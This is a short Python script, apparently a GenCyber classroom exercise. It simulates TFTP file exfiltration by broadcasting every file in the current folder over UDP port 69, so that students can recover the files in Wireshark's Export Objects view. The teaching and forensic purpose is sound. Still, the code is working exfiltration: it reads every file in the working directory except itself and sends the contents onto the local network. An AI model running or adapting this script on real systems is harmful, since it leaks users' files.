# GenCyber_4e.py
# Simulates TFTP file exfiltration via UDP so Wireshark will show files under Export Objects -> TFTP

import socket
import os
import struct
import time

BROADCAST_IP = '<broadcast>'
PORT = 69  # TFTP standard port
CHUNK_SIZE = 512  # TFTP data block size

def send_wrq(sock, filename):
    # TFTP WRQ (Write Request): opcode 2
    mode = "octet"
    wrq_packet = struct.pack("!H", 2) + filename.encode() + b'\x00' + mode.encode() + b'\x00'
    sock.sendto(wrq_packet, (BROADCAST_IP, PORT))
    print(f"[+] Sent WRQ for {filename}")
    time.sleep(0.2)

def send_file_as_tftp(filename, sock):
    try:
        with open(filename, 'rb') as f:
            send_wrq(sock, filename)
            block = 1
            while True:
                data = f.read(CHUNK_SIZE)
                if not data:
                    break
                data_packet = struct.pack("!HH", 3, block) + data  # opcode 3 = DATA
                sock.sendto(data_packet, (BROADCAST_IP, PORT))
                block += 1
                time.sleep(0.1)
        print(f"[+] Sent {filename} as TFTP")
    except Exception as e:
        print(f"[!] Failed to send {filename}: {e}")

def exfiltrate_folder_tftp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    this_script = os.path.basename(__file__)
    files = [f for f in os.listdir('.') if os.path.isfile(f) and f != this_script]

    for file in files:
        send_file_as_tftp(file, s)

    s.close()
    print("[*] All files exfiltrated over fake TFTP.")

if __name__ == "__main__":
    print("Simulating TFTP broadcast of all files in folder. Watch Export Objects -> TFTP in Wireshark.")
    exfiltrate_folder_tftp()
